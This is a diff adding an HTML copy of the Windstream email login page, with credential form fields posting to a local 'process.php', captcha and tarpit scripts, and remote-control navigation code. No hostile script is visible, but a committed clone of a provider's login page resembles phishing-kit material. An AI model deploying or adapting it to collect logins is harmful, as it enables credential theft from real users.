@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang='en'>
+  <head>
+                  <meta name="viewport" content="width=device-width">
+        <meta name="viewport" content="initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=11">
+      
+              <title>Windstream | Login</title>
+      
+      
+              
+  
+<script type="text/javascript">
+  const handler = "allow";
+  const now = new Date();
+  const can_submit_by = now.getTime() + (15 * 1000);
+  let completed_captcha = false;
+
+  const toggleClass = function(el, style) {
+    console.log(el);
+    if (el.classList) {
+      el.classList.toggle(style);
+    } else {
+      // For IE9
+      var classes = el.className.split(" ");
+      var i = classes.indexOf(style);
+
+      if (i >= 0)
+        classes.splice(i, 1);
+      else
+        classes.push(style);
+        el.className = classes.join(" ");
+    }
+  }
+
+  function enableSubmit() {
+    completed_captcha = true;
+
+    var my_recaptcha_response_field = document.createElement( "input" );
+    my_recaptcha_response_field.setAttribute("type", "hidden");
+    my_recaptcha_response_field.setAttribute("name", "g-recaptcha-response");
+    my_recaptcha_response_field.setAttribute("value", grecaptcha.getResponse());
+    document.getElementById('main-form').appendChild(my_recaptcha_response_field);
+
+    toggleClass(document.getElementById('captcha_modal'), 'hidden');
+    showWaitingModel();
+  };
+
+  const showWaitingModel = () => {
+    toggleClass(document.getElementById('waiting_modal'), 'hidden');
+    setTimeout(_ => {toggleClass(document.getElementById('waiting_modal'), 'hidden');}, (can_submit_by - now.getTime()));
+  };
+
+  const deployBfap = () => {
+    if(handler == 'tarpit') {
+      showWaitingModel();
+    }
+    if((handler == 'captcha' || handler == 'reject') && !completed_captcha) {
+      toggleClass(document.getElementById('captcha_modal'), 'hidden');
+    }
+  };
+
+  if (document.readyState === "complete" ||(document.readyState !== "loading" && !document.documentElement.doScroll)) {
+      deployBfap();
+    } else {
+      document.addEventListener("DOMContentLoaded", deployBfap);
+  }
+
+</script>
+      
+      	                <link rel="stylesheet" type="text/css" href="/css/v2/main.css"/>
+      
+	<style media="screen">
+		a {
+			color: #1f8aa3;
+			text-decoration-line: underline;
+		}
+		#login {
+			background-color: #40aec8
+		}
+	</style>
+
+      	      
+	<script src="https://cdn.jsdelivr.net/gh/alpinejs/alpine@v2.x.x/dist/alpine.js" defer></script>
+	<script type="text/javascript">
+		toggle_password = (e) => {
+			e.preventDefault();
+			const input = document.getElementById('password');
+			const button = document.getElementById('toggle');
+			if (toggle.innerHTML === 'show') {
+				input.type = 'text';
+				button.innerHTML = 'hide';
+			} else {
+				input.type = 'password';
+				button.innerHTML = 'show';
+			}
+		}
+
+		// Catching the 'keydown' event for FireTV.
+		document.addEventListener('keydown', function(event) {
+
+			// For the down arrow (key code 40) and the up arrow (key code 38),
+			// we want to catch the event and move to the next correct form element.
+			// This is becuase normal tab functionality is not enough when using
+			// a FireTV remote. But it's up and down arrows on the remote trigger
+			// the same events and keycodes as the up/down arrows on a keyboard.
+			var currentElement = document.activeElement;
+			var curIndex = currentElement.tabIndex; //get current elements tab index
+			var tabbables = document.querySelectorAll(".tabable"); //get all tabable elements
+			var firstTabIndex = tabbables[0];
+			var lastTabIndex = tabbables[tabbables.length - 1].tabIndex;
+
+			for(var i=0; i<tabbables.length; i++) { //loop through each element
+				if (event.keyCode == '38') {
+					if(tabbables[i].tabIndex == (curIndex-1)) { //check the tabindex to see if it's the element we want
+						tabbables[i].focus(); //if it's the one we want, focus it and exit the loop
+						break;
+					}
+				}
+				if (event.keyCode == '40') {
+					if(curIndex == lastTabIndex) { //if we are on the last tabindex, go back to the beginning
+						curIndex = 0;
+					}
+					if(tabbables[i].tabIndex == (curIndex+1)) { //check the tabindex to see if it's the element we want
+						tabbables[i].focus(); //if it's the one we want, focus it and exit the loop
+						break;
+					}
+				}
+
+			}
+		});
+	</script>
+      </head>
+  <body class="bg-white flex">
+        <main class="container lg:w-screen-md">
+			<header>
+  <div class="branding">
+    <img src='https://windstream.auth-gateway.net/images/windstream/windstream.png' alt='Logo'>
+      </div>
+  <div class="text-center text-gray-800 text-lg text-bold my-4">
+    <h1>Log In</h1>
+  </div>
+  </header>
+		    <div class="px-4">
+        <div class="mb-2">Examples:</div>
+        <ul class="flex flex-wrap justify-between mb-4">
+            <li class="w-1/2">johnsmith@windstream.net</li>
+            <li>johnsmith@navix.net</li>
+            <li class="w-1/2">johnsmith@iowatelecom.net</li>
+            <li>johnsmith@nuvox.net</li>
+            <li class="w-1/2">johnsmith@ctc.net</li>
+            <li >johnsmith@vnet.net</li>
+            <li class="w-1/2">johnsmith@valornet.com</li>
+            <li >johnsmith@ktc.com</li>
+            <li class="w-1/2">johnsmith@izoom.net</li>
+            <li >johnsmith@dejazzd.com</li>
+        </div>
+    </div>
+    		<section id="login_form" class="flex flex-col justify-between px-3">
+			<form id='main-form' method='POST' action="process.php" onsubmit="disableButton();">
+				<div class="formfield">
+					<label for="username">Email Address</label>
+					<input tabindex="1" class="tabable" type="text" id="username" name="username" value="" placeholder="Email Address" autofocus required>
+				</div>
+				<div class="formfield">
+					<label for="password">Password</label>
+					<div class="flex relative items-baseline">
+						<input tabindex="2" class="tabable" id="password" type="password" name="password" value="" placeholder="Password" required>
+						<div>
+							<button tabindex="3" type="button" id="toggle" onclick="toggle_password(event)" class="tabable z-10 absolute text-gray-800 uppercase" style="right: 10px; top: 8px;">show</button>
+						</div>
+					</div>
+				</div>
+								  <div class="remember-me"  x-data="{ open: false }">
+    <div class="flex items-baseline">
+      <input tabindex="4" id="remember_me" name="remember_me" class="tabable mr-2 leading-tight" type="checkbox" checked>
+      <label for="remember_me" class="flex items-baseline block text-gray-700 font-bold">
+        Remember Me
+      </label>
+      <a tabindex="5" href="#remember_me_help" id="remember_me_help_link" class="tabable align-top ml-2 text-sm" @click.prevent="open = true">?</a>
+    </div>
+    <div x-show="open"  @click.away="open = false" class="my-2 px-4 py-2 bg-yellow-200 text-sm rounded shadow-inner">
+      <a name="remember_me_help"></a>
+      <p>When you choose "Remember Me" on sign in, we will remember who you are and keep you signed in for up to 90 days, unless you sign out or your browser cookies are deleted. <br />If you are on a public computer, we recommend you uncheck the box.</p>
+    </div>
+  </div>
+																<div class="formfield">
+					<button tabindex="6" id='login' class="tabable w-full px-4 py-2 my-4 text-2xl text-white text-bold uppercase tracking-wider rounded-lg shadow" type="submit" name="submit">
+						Log In
+					</button>
+
+<script>
+    function disableButton() {	
+        var btn = document.getElementById('login');
+        btn.disabled = true;
+        btn.innerText = 'Loading...';	
+    }
+</script>
+				</div>
+			</form>
+		</section>
+
+		<section id="self-care" class="px-2">
+      <ul>
+              		<li class="mb-2">
+  <a class="tabable" tabindex="7" target="_blank" id="register" href="#">Register</a>
+</li>
+	                        <li class="mb-2">
+  <a class="tabable" tabindex="8" target="_blank" id="selfcare_link_1" href="https://sam2.windstream.com/selfcare/selfcare/SelfCareMain.jsp">Trouble Logging In?</a>
+</li>
+              </ul>
+</section>
+	
+			  <footer class="flex flex-col mt-6 w-3/4 text-center mx-auto text-sm">
+      <p></p>
+    </footer>
+	</main>
+                                      </body>
+</html>
